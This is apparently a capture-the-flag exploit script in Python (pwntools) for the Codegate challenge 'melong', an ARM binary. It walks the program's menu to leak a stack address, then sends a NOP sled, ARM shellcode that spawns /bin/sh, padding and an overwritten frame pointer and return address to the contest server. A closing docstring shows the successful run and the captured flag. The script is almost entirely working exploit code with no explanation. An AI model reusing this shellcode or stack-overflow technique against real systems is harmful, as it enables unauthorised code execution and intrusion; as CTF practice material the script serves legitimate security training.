from pwn import *

def melong(DEBUG="1"):
	def Checkbmi(height, weight):
		r.sendline("1")
		r.recvuntil("Your height(meters) : ")
		r.sendline(str(height))
		r.recvuntil("Your weight(kilograms) : ")
		r.sendline(str(weight))
		return r.recvuntil("Type the number:")
		
	def Exercise():
		r.sendline("2")
		return r.recvuntil("Type the number:")
		
	def PT(howlong):
		r.sendline("3")
		r.recvuntil("How long do you want to take personal training?")
		r.sendline(str(howlong))
		return r.recvuntil("Type the number:")
		
	def WriteDailyRecord(payload):
		r.sendline("4")
		r.send(payload)
		
		return r.recvuntil("Type the number:")


	if DEBUG=="1":
		r = process(["qemu-arm-static","-g","12345", "./melong"])
		# target remote localhost:12345
		raw_input("Debug?")
	elif DEBUG=="2":
		r = process(["qemu-arm-static","./melong"])
		raw_input("Debug?")
	elif DEBUG=="3":
		HOST = "ch41l3ng3s.codegate.kr"
		PORT = 1199
		r = remote(HOST,PORT)
	
	nop = "\x00\x00\xa0\xe1"
	main = 0x000110D4
	data = 0x23064 
	shellcode = "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0e\x30\x01\x90\x49\x1a\x92\x1a\x08\x27\xc2\x51\x03\x37\x01\xdf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x00"
	r.recvuntil("Type the number:")
	Checkbmi(123, 123)
	Exercise()
	Checkbmi(123, 123)
	Exercise()
	PT(0)
	PT(80)
	PT(80)
	WriteDailyRecord("\xff"*0x50)
	res = WriteDailyRecord("\xff"*0x5C)
	stack = u32(res[10+0x5c:10+0x5c+4])
	log.info('stack: %#x' % stack)
	payload = nop*10
	payload += shellcode
	payload += "\xff"*(0x50-len(payload))
	payload += p32(stack) # fp
	payload += p32(stack-0x190) # pc
	WriteDailyRecord(payload)
	r.sendline("6")
	r.sendline("cat flag")
	r.interactive()
	
melong(sys.argv[1])

"""
$ python melong.py 3
[+] Opening connection to ch41l3ng3s.codegate.kr on port 1199: Done
[*] stack: 0xf6fffdf4
[*] Switching to interactive mode
See you again :)
FLAG{D0n7_7h1nk_7ha7_1_Can_3xp1ain_it}
$ 
"""